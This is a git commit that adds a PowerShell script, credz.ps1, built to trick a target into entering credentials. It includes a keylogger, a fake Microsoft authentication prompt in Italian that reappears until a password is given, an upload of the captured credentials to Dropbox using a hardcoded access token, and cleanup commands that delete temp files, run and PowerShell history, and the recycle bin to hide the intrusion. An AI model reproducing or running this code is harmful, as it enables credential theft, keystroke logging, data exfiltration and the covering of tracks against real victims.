cc0c3a311501dfba0430fc5508b63edb167ae710
treviop <127845592+treviop@users.noreply.github.com>
2023-03-14 11:35:05 +0100

    Powershell script uploaded

---
+++ credz.ps1
@@ -0,0 +1,249 @@
+
+<#
+.SYNOPSIS
+	This script is meant to trick your target into sharing their credentials through a fake authentication pop up message
+
+.DESCRIPTION 
+	A pop up box will let the target know "Unusual sign-in. Please authenticate your Microsoft Account"
+	This will be followed by a fake authentication ui prompt. 
+	If the target tried to "X" out, hit "CANCEL" or while the password box is empty hit "OK" the prompt will continuously re pop up 
+	Once the target enters their credentials their information will be uploaded to your dropbox for collection
+
+.Link
+	https://developers.dropbox.com/oauth-guide		# Guide for setting up your DropBox for uploads
+
+#>
+
+#------------------------------------------------------------------------------------------------------------------------------------
+
+$DropBoxAccessToken = "sl.BagUiVCihLZ7mLzM9WrLnLdZ3eKsTLXgKQumBy_S4IQAhAf8qVg2p5fPxqI4V31ifG8P5hPeVxswdS3DHQvGMJMyxt9Xl31Y3I8mKV-I7Iu3egGMbdrCwxYV8khteDvHVeY3kW4"
+
+#------------------------------------------------------------------------------------------------------------------------------------
+
+$FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
+ 
+#------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+
+
+
+<#
+	WAIT FOR KEYBOARD
+#>
+
+
+#requires -Version 2
+function Start-KeyLogger($Path="$env:temp\keylogger.txt") 
+#function Start-KeyLogger($Path="C:\Users\Irene\Desktop\OMG\testing\file.txt")
+{
+  # Signatures for API Calls
+  $signatures = @'
+[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
+public static extern short GetAsyncKeyState(int virtualKeyCode); 
+[DllImport("user32.dll", CharSet=CharSet.Auto)]
+public static extern int GetKeyboardState(byte[] keystate);
+[DllImport("user32.dll", CharSet=CharSet.Auto)]
+public static extern int MapVirtualKey(uint uCode, int uMapType);
+[DllImport("user32.dll", CharSet=CharSet.Auto)]
+public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
+'@
+
+  # load signatures and make members available
+  $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
+    
+  # create output file
+  $null = New-Item -Path $Path -ItemType File -Force
+
+  try
+  {
+    Write-Host 'Recording key presses. Press CTRL+C to see results.' -ForegroundColor Red
+    
+	$iteration = 1
+	
+    # create endless loop. When user presses CTRL+C, finally-block
+    # executes and shows the collected key presses
+    while ($iteration -lt 50) {
+	  
+      Start-Sleep -Milliseconds 40
+      
+      # scan all ASCII codes above 8
+      for ($ascii = 9; $ascii -le 254; $ascii++) {
+        # get current key state
+        $state = $API::GetAsyncKeyState($ascii)
+
+        # is key pressed?
+        if ($state -eq -32767) {
+          $null = [console]::CapsLock
+
+          # translate scan code to real code
+          $virtualKey = $API::MapVirtualKey($ascii, 3)
+
+          # get keyboard state for virtual keys
+          $kbstate = New-Object Byte[] 256
+          $checkkbstate = $API::GetKeyboardState($kbstate)
+
+          # prepare a StringBuilder to receive input key
+          $mychar = New-Object -TypeName System.Text.StringBuilder
+
+          # translate virtual key
+          $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
+          
+		  Write-Host "Key pressed $mychar and iteration n. $iteration"
+	      $iteration = $iteration + 1
+		  
+          if ($success) 
+          {
+            # add key to logger file
+            [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode) 
+          }
+        }
+      }
+    }
+  }
+  finally
+  {
+    Write-Host "Running script"
+  }
+}
+
+
+# records all key presses until script is aborted by pressing CTRL+C
+# will then open the file with collected key codes
+Start-KeyLogger
+
+
+
+
+<#
+
+.NOTES 
+	This is to generate the ui.prompt you will use to harvest their credentials
+#>
+
+function Get-Creds {
+do{
+$cred = $host.ui.promptforcredential('Autenticazione fallita','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
+   if([string]::IsNullOrWhiteSpace([Net.NetworkCredential]::new('', $cred.Password).Password)) {
+    [System.Windows.Forms.MessageBox]::Show("Necessario inserire credenziali utente")
+    Get-Creds
+}
+$creds = $cred.GetNetworkCredential() | fl
+return $creds
+  # ...
+
+  $done = $true
+} until ($done)
+
+}
+
+#----------------------------------------------------------------------------------------------------
+
+<#
+
+.NOTES 
+	This is to pause the script until a mouse movement is detected
+#>
+
+function Pause-Script{
+Add-Type -AssemblyName System.Windows.Forms
+$originalPOS = [System.Windows.Forms.Cursor]::Position.X
+$o=New-Object -ComObject WScript.Shell
+
+    while (1) {
+        $pauseTime = 3
+        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
+            break
+        }
+        else {
+            $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
+        }
+    }
+}
+
+#----------------------------------------------------------------------------------------------------
+
+# This script repeadedly presses the capslock button, this snippet will make sure capslock is turned back off 
+
+function Caps-Off {
+Add-Type -AssemblyName System.Windows.Forms
+$caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')
+
+#If true, toggle CapsLock key, to ensure that the script doesn't fail
+if ($caps -eq $true){
+
+$key = New-Object -ComObject WScript.Shell
+$key.SendKeys('{CapsLock}')
+}
+}
+#----------------------------------------------------------------------------------------------------
+
+<#
+
+.NOTES 
+	This is to call the function to pause the script until a mouse movement is detected then activate the pop-up
+#>
+
+Pause-Script
+
+Caps-Off
+
+Add-Type -AssemblyName System.Windows.Forms
+
+[System.Windows.Forms.MessageBox]::Show("Errore con SYSMON4.dll, autenticarsi nuovamente a Microsoft Account")
+
+$creds = Get-Creds
+
+#------------------------------------------------------------------------------------------------------------------------------------
+
+<#
+
+.NOTES 
+	This is to save the gathered credentials to a file in the temp directory
+#>
+
+echo $creds >> $env:TMP\$FileName
+
+#------------------------------------------------------------------------------------------------------------------------------------
+
+<#
+
+.NOTES 
+	This is to upload your files to dropbox
+#>
+
+$TargetFilePath="/$FileName"
+$SourceFilePath="$env:TMP\$FileName"
+$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
+$authorization = "Bearer " + $DropBoxAccessToken
+$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
+$headers.Add("Authorization", $authorization)
+$headers.Add("Dropbox-API-Arg", $arg)
+$headers.Add("Content-Type", 'application/octet-stream')
+Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
+
+#------------------------------------------------------------------------------------------------------------------------------------
+
+<#
+
+.NOTES 
+	This is to clean up behind you and remove any evidence to prove you were there
+#>
+
+# Delete contents of Temp folder 
+
+rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
+
+# Delete run box history
+
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+
+# Delete powershell history
+
+Remove-Item (Get-PSreadlineOption).HistorySavePath
+
+# Deletes contents of recycle bin
+
+Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+
